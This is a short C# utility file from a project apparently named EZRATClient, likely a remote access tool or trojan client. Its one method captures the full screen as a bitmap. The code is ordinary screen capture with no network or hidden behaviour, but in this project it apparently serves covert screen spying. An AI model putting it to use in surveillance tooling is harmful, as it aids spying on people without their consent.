using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace EZRATClient.Utils
{
    class ScreenUtils
    {

        public static Image ScreenShot()
        {
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            Image result = new Bitmap(bounds.Width,bounds.Height);

            using (Graphics g = Graphics.FromImage(result))
            {
                g.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);
            }

            return result;
        }

    }
}
